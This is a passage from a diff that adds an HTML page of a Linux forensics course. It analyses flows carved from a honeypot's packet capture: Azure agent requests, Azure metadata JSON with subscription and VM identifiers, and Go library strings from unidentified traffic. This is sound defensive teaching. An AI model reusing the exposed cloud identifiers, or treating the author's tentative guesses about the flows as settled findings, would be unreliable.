+flows/045.137.155.055.00080-010.000.000.004.49646:                   data
+flows/045.137.155.055.00080-010.000.000.004.51612:                   data
+flows/045.137.155.055.00080-010.000.000.004.56488:                   ASCII text, with very long lines, with no line terminators
+flows/045.137.155.055.00080-010.000.000.004.57366:                   data
+flows/045.137.155.055.00080-010.000.000.004.57466:                   ASCII text, with very long lines, with no line terminators
+flows/052.147.219.192.00080-010.000.000.004.36444:                   data
+flows/052.147.219.192.00080-010.000.000.004.36444-HTTPBODY-001:      data
+flows/052.147.219.192.00080-010.000.000.004.36444-HTTPBODY-002:      data
+flows/091.189.091.038.00080-010.000.000.004.37850:                   data
+flows/168.063.129.016.00080-010.000.000.004.38350:                   data
+flows/168.063.129.016.00080-010.000.000.004.38382:                   data
+flows/168.063.129.016.00080-010.000.000.004.38390:                   data
+flows/168.063.129.016.00080-010.000.000.004.38390-HTTPBODY-001:      data
+flows/168.063.129.016.00080-010.000.000.004.38396:                   data
+flows/168.063.129.016.00080-010.000.000.004.38396-HTTPBODY-001:      data
+flows/168.063.129.016.00080-010.000.000.004.38402:                   ASCII text, with CRLF line terminators
+flows/168.063.129.016.00080-010.000.000.004.38402c1:                 data
+flows/168.063.129.016.00080-010.000.000.004.38402c1-HTTPBODY-001:    data
+flows/168.063.129.016.00080-010.000.000.004.38420:                   data
+flows/168.063.129.016.00080-010.000.000.004.38420-HTTPBODY-001:      data
+flows/168.063.129.016.00080-010.000.000.004.59124:                   data
+flows/168.063.129.016.00080-010.000.000.004.59124-HTTPBODY-001:      data
+flows/168.063.129.016.00080-010.000.000.004.59124c1:                 ASCII text, with CRLF line terminators
+flows/168.063.129.016.00080-010.000.000.004.59124c2:                 data
+flows/168.063.129.016.00080-010.000.000.004.59124c2-HTTPBODY-001:    data
+flows/168.063.129.016.00080-010.000.000.004.59146:                   data
+flows/168.063.129.016.00080-010.000.000.004.59146-HTTPBODY-001:      data
+flows/168.063.129.016.00080-010.000.000.004.60092:                   data
+flows/168.063.129.016.00080-010.000.000.004.60092-HTTPBODY-001:      data
+flows/168.063.129.016.00080-010.000.000.004.60102:                   ASCII text, with CRLF line terminators
+flows/168.063.129.016.00080-010.000.000.004.60102c1:                 data
+flows/168.063.129.016.00080-010.000.000.004.60102c1-HTTPBODY-001:    data
+flows/168.063.129.016.00080-010.000.000.004.60118:                   data
+flows/168.063.129.016.00080-010.000.000.004.60118-HTTPBODY-001:      data
+flows/169.254.169.254.00080-010.000.000.004.33576:                   ASCII text, with very long lines, with CRLF line terminators
+flows/169.254.169.254.00080-010.000.000.004.33576-HTTPBODY-001.json: ASCII text, with very long lines, with no line terminators
+flows/169.254.169.254.00080-010.000.000.004.54298:                   ASCII text, with very long lines, with CRLF line terminators
+flows/169.254.169.254.00080-010.000.000.004.54298-HTTPBODY-001.json: ASCII text, with very long lines, with no line terminators
+flows/169.254.169.254.00080-010.000.000.004.55276:                   ASCII text, with very long lines, with CRLF line terminators
+flows/169.254.169.254.00080-010.000.000.004.55276-HTTPBODY-001.json: ASCII text, with very long lines, with no line terminators
+flows/172.067.178.057.00080-010.000.000.004.56008:                   data
+flows/185.104.045.029.00080-010.000.000.004.46464:                   data
+flows/185.104.045.029.00080-010.000.000.004.46472:                   data
+flows/185.199.111.133.00443-010.000.000.004.57210:                   data
+flows/report.xml:                                                    XML 1.0 document text
+</pre>
+
+<p>We can start with some of the ASCII data which is easier to read:</p>
+
+<pre>
+[lab@LAB be-output]$ <b>cat flows/010.000.000.004.59198-168.063.129.016.00080</b>
+GET /machine/?comp=goalstate HTTP/1.1
+Host: 168.63.129.16
+Accept-Encoding: identity
+x-ms-agent-name: WALinuxAgent
+x-ms-version: 2012-11-30
+Connection: close
+User-Agent: WALinuxAgent/2.5.0.2
+</pre>
+
+<p>A little Google-ing and we learn that WALinuxAgent is a tool Microsoft employs in Azure to gather
+  telemetry from its hosts. Therefore traffic with 168.63.129.16 seems benign. I will speculate
+  that the <tt>*.json</tt> files communicated with 169.254.169.254 are also Azure telemetry:</p>
+
+<pre>
+[lab@LAB be-output]$ <b>cat flows/169.254.169.254.00080-010.000.000.004.33576-HTTPBODY-001.json</b>
+{"compute":{"location":"eastus","name":"ApacheWebServer","offer":"UbuntuServer","osType":"Linux","placementGroupId":"",
+"platformFaultDomain":"0","platformUpdateDomain":"0","publisher":"Canonical","resourceGroupName":"apache_honey","sku":
+"18.04-LTS","subscriptionId":"cbb8203f-4cea-4480-bb1a-057a69bec7c8","tags":"Honeypot:apache","version":"18.04.202109280",
+"vmId":"ac7f5daa-82cb-46c8-a2ff-306368a72ae7","vmScaleSetName":"","vmSize":"Standard_B1s","zone":""},"network":{"interface":
+[{"ipv4":{"ipAddress":[{"privateIpAddress":"10.0.0.4","publicIpAddress":"13.82.150.103"}],"subnet":[{"address":"10.0.0.0",
+"prefix":"24"}]},"ipv6":{"ipAddress":[]},"macAddress":"002248263B16"}]}}
+</pre>
+
+<p>Check in on the <tt>052.147.219.192.00080-010.000.000.004.36444-HTTPBODY-*</tt> files and you
+  will see they are package listings from Ubuntu repos. This traffic also appears to be benign.</p>
+
+<p>The two flows with IP 45.137.155.55 that are ASCII text are both big blobs of hex-encoded data.
+  So far I have not been able to get anything useful out of these flows. While the other flows are
+marked as "<tt>data</tt>", many of them do contain recognizable strings:</p>
+
+<pre>
+[lab@LAB be-output]$ <b>head flows/045.137.155.055.00080-010.000.000.004.42636</b>
+e      NotBefore      NumMethod      NumSubexp      OpenFiles      ParamName      ParseForm      Pdeathsig     Precision
+       PromiseID      ProxyDial      ProxyFunc      PublicKey      PushFront      QuickSpan      RawIssuer      ReadBytes
+       ReadFrame      ReadMsgIP      ReadSlice      ReadUint8      RemoveAll      RoundTrip     Sensitive       ServeConn
+<i>[... snip ...]</i>
+crypto/aes
+crypto/des
+crypto/dsa
+crypto/md5
+crypto/rc4
+crypto/rsa
+crypto/tls
+hash/crc32
+</pre>
+
+<p>Many of the other flows are just binary data with no recognizable strings. I wonder if 
+  these are fragments of compressed web page data, or SSL data? Without the whole stream, however, there would
+  be no hope of decoding them.</p>
+
+
+
+<h1> </h1>
+<hr>
+<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/4.0/88x31.png" /></a><br /><span xmlns:dct="http://purl.org/dc/terms/" property="dct:title">Linux Forensics</span> by <span xmlns:cc="http://creativecommons.org/ns#" property="cc:attributionName">Hal Pomeranz</span> is licensed under a 
+<br><a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.
+
+</BODY>
+</HTML>
